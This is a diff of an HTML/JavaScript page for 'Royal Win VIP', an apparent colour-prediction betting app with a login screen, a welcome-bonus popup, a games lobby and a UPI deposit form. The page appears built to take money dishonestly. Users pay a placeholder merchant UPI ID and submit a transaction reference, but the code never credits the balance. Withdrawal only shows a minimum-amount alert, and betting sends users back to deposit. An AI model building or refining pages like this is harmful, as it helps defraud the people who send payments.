@@ -5,60 +5,315 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Royal Win VIP</title>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Poppins', sans-serif; }
-        body { background: #0f172a; color: #fff; text-align: center; padding: 20px; }
-        header { background: #1e293b; padding: 15px; border-radius: 12px; margin-bottom: 20px; font-size: 22px; font-weight: bold; color: #facc15; border: 1px solid #eab308; }
-        .card { background: #1e293b; padding: 20px; border-radius: 12px; margin-bottom: 20px; border: 1px solid #334155; }
-        .balance { font-size: 26px; color: #4ade80; margin-top: 5px; font-weight: bold; }
-        .btn { background: #2563eb; color: #fff; border: none; padding: 12px 24px; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; margin: 10px 5px; }
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); align-items: center; justify-content: center; }
-        .modal-content { background: #1e293b; padding: 25px; border-radius: 12px; width: 90%; max-width: 350px; text-align: center; position: relative; border: 1px solid #38bdf8; }
-        input { width: 100%; padding: 12px; margin: 12px 0; border-radius: 6px; border: 1px solid #334155; background: #0f172a; color: #fff; font-size: 14px; text-align: center; }
-        .close { position: absolute; top: 10px; right: 15px; font-size: 22px; cursor: pointer; color: #94a3b8; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background: #0f172a; color: #fff; max-width: 480px; margin: 0 auto; padding-bottom: 70px; min-height: 100vh; position: relative; }
+
+        /* Auth Screen (Login / Register) */
+        #authScreen { position: fixed; inset: 0; background: #0f172a; z-index: 2000; padding: 25px; display: flex; flex-direction: column; justify-content: center; max-width: 480px; margin: 0 auto; }
+        .auth-logo { font-size: 28px; font-weight: 900; color: #facc15; margin-bottom: 5px; text-shadow: 0 0 10px rgba(250, 204, 21, 0.3); }
+        .auth-sub { font-size: 13px; color: #94a3b8; margin-bottom: 30px; }
+        .form-group { text-align: left; margin-bottom: 15px; }
+        .form-group label { font-size: 12px; color: #cbd5e1; display: block; margin-bottom: 5px; }
+        .form-input { width: 100%; padding: 14px; border-radius: 10px; border: 1px solid #334155; background: #1e293b; color: #fff; font-size: 15px; outline: none; }
+        .btn-auth { width: 100%; padding: 14px; background: linear-gradient(135deg, #eab308, #ca8a04); border: none; border-radius: 10px; color: #000; font-weight: 800; font-size: 16px; margin-top: 10px; cursor: pointer; box-shadow: 0 4px 15px rgba(234, 179, 8, 0.4); }
+
+        /* Offer Popup Modal */
+        #offerModal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 1500; align-items: center; justify-content: center; padding: 20px; }
+        .offer-card { background: linear-gradient(145deg, #1e293b, #0f172a); border: 2px solid #facc15; border-radius: 20px; padding: 25px; text-align: center; position: relative; max-width: 320px; box-shadow: 0 0 25px rgba(250, 204, 21, 0.3); }
+        .offer-badge { background: #ef4444; color: #fff; font-size: 11px; font-weight: 800; padding: 4px 10px; border-radius: 12px; display: inline-block; margin-bottom: 10px; }
+        .offer-title { font-size: 20px; font-weight: 800; color: #facc15; margin-bottom: 8px; }
+        .offer-desc { font-size: 13px; color: #cbd5e1; margin-bottom: 20px; line-height: 1.4; }
+        .btn-claim { background: #22c55e; color: #fff; border: none; padding: 12px 25px; border-radius: 10px; font-weight: 700; width: 100%; cursor: pointer; font-size: 15px; }
+        .close-offer { position: absolute; top: -12px; right: -12px; background: #ef4444; color: #fff; width: 30px; height: 30px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; cursor: pointer; border: 2px solid #fff; }
+
+        /* Main App Header */
+        .app-bar { background: #1e293b; padding: 15px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #334155; }
+        .app-title { font-size: 18px; font-weight: 800; color: #facc15; }
+        
+        /* Wallet Banner */
+        .wallet-card { background: linear-gradient(135deg, #2563eb, #1d4ed8); margin: 15px; padding: 18px; border-radius: 16px; box-shadow: 0 8px 20px rgba(37, 99, 235, 0.3); }
+        .wallet-balance { font-size: 28px; font-weight: 800; margin: 5px 0 15px 0; }
+        .wallet-actions { display: flex; gap: 10px; }
+        .action-btn { flex: 1; padding: 10px; border-radius: 8px; border: none; font-weight: 700; font-size: 14px; cursor: pointer; }
+        .btn-dep { background: #facc15; color: #000; }
+        .btn-with { background: rgba(255,255,255,0.2); color: #fff; }
+
+        /* Games Grid Section */
+        .section-title { font-size: 16px; font-weight: 700; color: #facc15; text-align: left; margin: 20px 15px 12px 15px; display: flex; align-items: center; gap: 6px; }
+        .games-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; padding: 0 15px; }
+        .game-card { background: #1e293b; border: 1px solid #334155; border-radius: 14px; padding: 15px; text-align: left; cursor: pointer; transition: transform 0.2s; position: relative; overflow: hidden; }
+        .game-card:active { transform: scale(0.96); }
+        .game-icon { font-size: 32px; margin-bottom: 8px; }
+        .game-name { font-size: 15px; font-weight: 800; color: #fff; }
+        .game-sub { font-size: 11px; color: #94a3b8; margin-top: 2px; }
+        .hot-tag { position: absolute; top: 8px; right: 8px; background: #ef4444; color: #fff; font-size: 9px; font-weight: 800; padding: 2px 6px; border-radius: 6px; }
+
+        /* Wingo Game View */
+        #wingoGame { display: none; padding: 15px; }
+        .timer-box { background: #1e293b; padding: 15px; border-radius: 12px; border: 1px solid #334155; display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
+        .color-btns { display: flex; gap: 10px; margin-bottom: 15px; }
+        .c-btn { flex: 1; padding: 14px 0; border-radius: 8px; border: none; font-weight: 800; font-size: 15px; color: #fff; cursor: pointer; }
+        .bg-green { background: #16a34a; }
+        .bg-violet { background: #9333ea; }
+        .bg-red { background: #dc2626; }
+        .number-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 8px; }
+        .num-btn { background: #0f172a; border: 1px solid #334155; color: #fff; padding: 12px 0; border-radius: 8px; font-weight: 700; font-size: 16px; cursor: pointer; }
+
+        /* Bottom Nav Bar */
+        .nav-bar { position: fixed; bottom: 0; left: 0; right: 0; max-width: 480px; margin: 0 auto; background: #1e293b; display: flex; justify-content: space-around; padding: 10px 0; border-top: 1px solid #334155; }
+        .nav-item { color: #64748b; font-size: 11px; text-decoration: none; display: flex; flex-direction: column; align-items: center; gap: 3px; cursor: pointer; }
+        .nav-active { color: #facc15; font-weight: 700; }
+
+        /* Deposit Modal & Payment Options */
+        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); align-items: center; justify-content: center; z-index: 3000; padding: 15px; }
+        .modal-content { background: #1e293b; padding: 20px; border-radius: 16px; width: 100%; max-width: 380px; text-align: left; border: 1px solid #38bdf8; position: relative; max-height: 90vh; overflow-y: auto; }
+        .close { position: absolute; top: 12px; right: 15px; font-size: 22px; color: #94a3b8; cursor: pointer; }
+        
+        .amount-chips { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin: 12px 0; }
+        .chip { background: #0f172a; border: 1px solid #334155; padding: 10px; border-radius: 8px; text-align: center; font-size: 13px; font-weight: 700; color: #facc15; cursor: pointer; }
+        .chip:hover { border-color: #facc15; background: rgba(250, 204, 21, 0.1); }
+
+        .payment-methods { margin: 15px 0; }
+        .pm-option { display: flex; align-items: center; justify-content: space-between; background: #0f172a; padding: 12px; border-radius: 10px; border: 1px solid #334155; margin-bottom: 8px; cursor: pointer; }
+        .pm-option:hover { border-color: #38bdf8; }
+        .pm-left { display: flex; align-items: center; gap: 10px; font-size: 14px; font-weight: 600; }
+        .pm-icon { font-size: 20px; }
     </style>
 </head>
 <body>
 
-    <header>👑 Royal Win VIP</header>
-
-    <div class="card">
-        <div>Available Balance</div>
-        <div class="balance">₹<span id="userBalance">0.00</span></div>
-        <button class="btn" onclick="openModal('depositModal')">+ Deposit</button>
-        <button class="btn" style="background:#dc2626;" onclick="alert('Minimum withdrawal amount is ₹110')">Withdraw</button>
+    <!-- 1. LOGIN / SIGNUP SCREEN -->
+    <div id="authScreen">
+        <div class="auth-logo">👑 ROYAL WIN VIP</div>
+        <div class="auth-sub">Enter Phone Number & Password to Continue</div>
+        
+        <div class="form-group">
+            <label>Phone Number</label>
+            <input type="tel" id="loginPhone" class="form-input" placeholder="Enter 10-digit Mobile Number">
+        </div>
+        <div class="form-group">
+            <label>Password</label>
+            <input type="password" id="loginPass" class="form-input" placeholder="Enter Password">
+        </div>
+        <button class="btn-auth" onclick="handleAuth()">LOGIN / REGISTER</button>
     </div>
 
-    <!-- Deposit Modal -->
+    <!-- 2. PROMOTION / OFFER POPUP -->
+    <div id="offerModal">
+        <div class="offer-card">
+            <div class="close-offer" onclick="closeOffer()">✕</div>
+            <span class="offer-badge">SPECIAL BONUS</span>
+            <div class="offer-title">🎁 100% Welcome Bonus</div>
+            <div class="offer-desc">Deposit ₹500 today and get extra ₹500 VIP Bonus credited instantly!</div>
+            <button class="btn-claim" onclick="closeOffer(); openModal('depositModal');">DEPOSIT NOW</button>
+        </div>
+    </div>
+
+    <!-- MAIN APP LOBBY -->
+    <div id="mainLobby" style="display:none;">
+        <div class="app-bar">
+            <div class="app-title">👑 ROYAL WIN VIP</div>
+            <div style="font-size:12px; color:#94a3b8;" id="userPhoneDisplay">ID: 98****12</div>
+        </div>
+
+        <div class="wallet-card">
+            <div style="font-size:12px; opacity:0.8;">Wallet Balance</div>
+            <div class="wallet-balance">₹<span id="userBalance">0.00</span></div>
+            <div class="wallet-actions">
+                <button class="action-btn btn-dep" onclick="openModal('depositModal')">+ Deposit</button>
+                <button class="action-btn btn-with" onclick="alert('Minimum Withdrawal ₹110 required')">Withdraw</button>
+            </div>
+        </div>
+
+        <!-- GAMES GRID -->
+        <div id="gamesSection">
+            <div class="section-title">🔥 Popular Games</div>
+            <div class="games-grid">
+                <div class="game-card" onclick="openGame('wingo')">
+                    <span class="hot-tag">HOT</span>
+                    <div class="game-icon">🎨</div>
+                    <div class="game-name">Win Go 1Min</div>
+                    <div class="game-sub">Guess Color & Number</div>
+                </div>
+                <div class="game-card" onclick="openGame('wingo')">
+                    <div class="game-icon">⚡</div>
+                    <div class="game-name">TRX Hash</div>
+                    <div class="game-sub">Fast Block Odds</div>
+                </div>
+                <div class="game-card" onclick="alert('Aviator coming soon in next update!')">
+                    <span class="hot-tag" style="background:#3b82f6;">NEW</span>
+                    <div class="game-icon">🚀</div>
+                    <div class="game-name">Aviator</div>
+                    <div class="game-sub">Crash Multiplier</div>
+                </div>
+                <div class="game-card" onclick="alert('Slots section unlocking soon!')">
+                    <div class="game-icon">🎰</div>
+                    <div class="game-name">VIP Slots</div>
+                    <div class="game-sub">Spin & Win Big</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- WINGO GAME ARENA -->
+        <div id="wingoGame">
+            <button onclick="backToLobby()" style="background:#334155; color:#fff; border:none; padding:8px 15px; border-radius:6px; font-size:12px; margin-bottom:15px; cursor:pointer;">← Back to Games</button>
+            
+            <div class="timer-box">
+                <div style="text-align:left;">
+                    <div style="font-size:12px; color:#94a3b8;">Win Go 1Min</div>
+                    <div style="font-size:15px; font-weight:700; color:#38bdf8;">202610021001</div>
+                </div>
+                <div style="text-align:right;">
+                    <div style="font-size:12px; color:#94a3b8;">Left Time</div>
+                    <div style="font-size:20px; font-weight:800; color:#facc15; font-family:monospace;" id="timer">00:45</div>
+                </div>
+            </div>
+
+            <div class="color-btns">
+                <button class="c-btn bg-green" onclick="placeBet('Green')">Green</button>
+                <button class="c-btn bg-violet" onclick="placeBet('Violet')">Violet</button>
+                <button class="c-btn bg-red" onclick="placeBet('Red')">Red</button>
+            </div>
+
+            <div class="number-grid">
+                <button class="num-btn" style="color:#a855f7;" onclick="placeBet('0')">0</button>
+                <button class="num-btn" style="color:#22c55e;" onclick="placeBet('1')">1</button>
+                <button class="num-btn" style="color:#ef4444;" onclick="placeBet('2')">2</button>
+                <button class="num-btn" style="color:#22c55e;" onclick="placeBet('3')">3</button>
+                <button class="num-btn" style="color:#ef4444;" onclick="placeBet('4')">4</button>
+                <button class="num-btn" style="color:#a855f7;" onclick="placeBet('5')">5</button>
+                <button class="num-btn" style="color:#ef4444;" onclick="placeBet('6')">6</button>
+                <button class="num-btn" style="color:#22c55e;" onclick="placeBet('7')">7</button>
+                <button class="num-btn" style="color:#ef4444;" onclick="placeBet('8')">8</button>
+                <button class="num-btn" style="color:#22c55e;" onclick="placeBet('9')">9</button>
+            </div>
+        </div>
+
+        <!-- BOTTOM NAV -->
+        <div class="nav-bar">
+            <div class="nav-item nav-active" onclick="backToLobby()">🎮<span>Games</span></div>
+            <div class="nav-item" onclick="openModal('depositModal')">💰<span>Deposit</span></div>
+            <div class="nav-item" onclick="alert('User VIP Level 1')">👤<span>Account</span></div>
+        </div>
+    </div>
+
+    <!-- MULTI-OPTION DEPOSIT MODAL -->
     <div id="depositModal" class="modal">
         <div class="modal-content">
             <span class="close" onclick="closeModal('depositModal')">&times;</span>
-            <h3 style="color:#38bdf8; margin-bottom:10px;">Deposit Wallet</h3>
-            <p style="font-size:13px; color:#94a3b8;">Pay via UPI & submit 12-Digit UTR Number</p>
-            
-            <div style="background:#0f172a; padding:12px; border-radius:8px; margin:15px 0; border:1px dashed #facc15;">
-                <p style="font-size:12px; color:#94a3b8;">Pay to UPI ID:</p>
-                <b style="color:#facc15; font-size:16px;">YOUR_UPI_HERE@paytm</b>
+            <h3 style="color:#38bdf8; font-size:18px; margin-bottom:5px;">Deposit Cash</h3>
+            <p style="font-size:12px; color:#94a3b8;">Select Deposit Amount & Payment Channel</p>
+
+            <div style="margin-top:12px;">
+                <label style="font-size:12px; color:#cbd5e1;">Deposit Amount (₹):</label>
+                <input type="number" id="depositAmount" value="500" style="width:100%; padding:10px; border-radius:8px; border:1px solid #334155; background:#0f172a; color:#4ade80; font-size:18px; font-weight:800; text-align:center; margin-top:5px;">
             </div>
 
-            <input type="number" id="utrInput" placeholder="Enter 12-Digit UTR / Ref No.">
-            <button class="btn" style="width:100%; background:#22c55e;" onclick="submitDeposit()">Submit Deposit</button>
+            <div class="amount-chips">
+                <div class="chip" onclick="setAmount(100)">₹100</div>
+                <div class="chip" onclick="setAmount(300)">₹300</div>
+                <div class="chip" onclick="setAmount(500)">₹500</div>
+                <div class="chip" onclick="setAmount(1000)">₹1000</div>
+                <div class="chip" onclick="setAmount(2000)">₹2000</div>
+                <div class="chip" onclick="setAmount(5000)">₹5000</div>
+            </div>
+
+            <label style="font-size:12px; color:#cbd5e1;">Select Payment Gateway:</label>
+            <div class="payment-methods">
+                <div class="pm-option" onclick="selectChannel('PhonePe')">
+                    <div class="pm-left"><span class="pm-icon">🟣</span> PhonePe Direct</div>
+                    <span style="font-size:11px; color:#22c55e; font-weight:700;">Fast</span>
+                </div>
+                <div class="pm-option" onclick="selectChannel('GPay')">
+                    <div class="pm-left"><span class="pm-icon">🔵</span> Google Pay</div>
+                    <span style="font-size:11px; color:#22c55e; font-weight:700;">Instant</span>
+                </div>
+                <div class="pm-option" onclick="selectChannel('Paytm')">
+                    <div class="pm-left"><span class="pm-icon">🔷</span> Paytm / BHIM UPI</div>
+                    <span style="font-size:11px; color:#facc15; font-weight:700;">Bonus</span>
+                </div>
+                <div class="pm-option" onclick="selectChannel('QR')">
+                    <div class="pm-left"><span class="pm-icon">📱</span> QR Code Scan</div>
+                    <span style="font-size:11px; color:#38bdf8; font-weight:700;">Auto</span>
+                </div>
+            </div>
+
+            <div style="background:#0f172a; padding:12px; border-radius:8px; margin-bottom:12px; border:1px dashed #facc15; text-align:center;">
+                <p style="font-size:11px; color:#94a3b8;">Pay to Official Merchant UPI:</p>
+                <b style="color:#facc15; font-size:15px;" id="merchantUpi">YOUR_UPI_HERE@paytm</b>
+            </div>
+
+            <input type="number" id="utrInput" placeholder="Enter 12-Digit UTR / Ref No." style="width:100%; padding:10px; border-radius:8px; border:1px solid #334155; background:#0f172a; color:#fff; text-align:center; margin-bottom:10px;">
+            <button class="btn-auth" style="margin-top:0;" onclick="submitDeposit()">CONFIRM DEPOSIT</button>
         </div>
     </div>
 
     <script>
-        function openModal(id) { document.getElementById(id).style.display = 'flex'; }
-        function closeModal(id) { document.getElementById(id).style.display = 'none'; }
-        
-        function submitDeposit() {
-            let utr = document.getElementById('utrInput').value;
-            if(utr.length < 10) {
-                alert('Please enter a valid 12-digit UTR Number');
+        function handleAuth() {
+            let phone = document.getElementById('loginPhone').value;
+            if(phone.length < 10) {
+                alert('Please enter a valid 10-digit Mobile Number');
                 return;
             }
-            alert('Deposit Request Submitted Successfully!');
+            document.getElementById('authScreen').style.display = 'none';
+            document.getElementById('mainLobby').style.display = 'block';
+            document.getElementById('offerModal').style.display = 'flex';
+            document.getElementById('userPhoneDisplay').innerText = 'ID: ' + phone.substring(0, 2) + '****' + phone.substring(6);
+        }
+
+        function closeOffer() { document.getElementById('offerModal').style.display = 'none'; }
+        function openModal(id) { document.getElementById(id).style.display = 'flex'; }
+        function closeModal(id) { document.getElementById(id).style.display = 'none'; }
+
+        function setAmount(amt) {
+            document.getElementById('depositAmount').value = amt;
+        }
+
+        function selectChannel(name) {
+            alert(name + ' Gateway Selected! Complete payment to UPI & enter 12-digit UTR below.');
+        }
+
+        function openGame(type) {
+            document.getElementById('gamesSection').style.display = 'none';
+            document.getElementById('wingoGame').style.display = 'block';
+        }
+
+        function backToLobby() {
+            document.getElementById('wingoGame').style.display = 'none';
+            document.getElementById('gamesSection').style.display = 'block';
+        }
+
+        function placeBet(val) {
+            let balance = parseFloat(document.getElementById('userBalance').innerText);
+            if(balance < 10) {
+                alert('Insufficient Balance! Please Add Cash.');
+                openModal('depositModal');
+            } else {
+                alert('Bet placed on ' + val);
+            }
+        }
+
+        function submitDeposit() {
+            let utr = document.getElementById('utrInput').value;
+            let amt = document.getElementById('depositAmount').value;
+            if(utr.length < 10) {
+                alert('Please enter valid 12-digit UTR Number');
+                return;
+            }
+            alert('Deposit Request of ₹' + amt + ' Submitted Successfully! Verification in progress.');
             closeModal('depositModal');
             document.getElementById('utrInput').value = '';
         }
+
+        // Live Timer
+        let timeLeft = 45;
+        setInterval(() => {
+            if(timeLeft <= 0) timeLeft = 60;
+            timeLeft--;
+            let sec = timeLeft < 10 ? "0" + timeLeft : timeLeft;
+            document.getElementById('timer').innerText = "00:" + sec;
+        }, 1000);
     </script>
 </body>
-</html>
+                    </html>
+                    
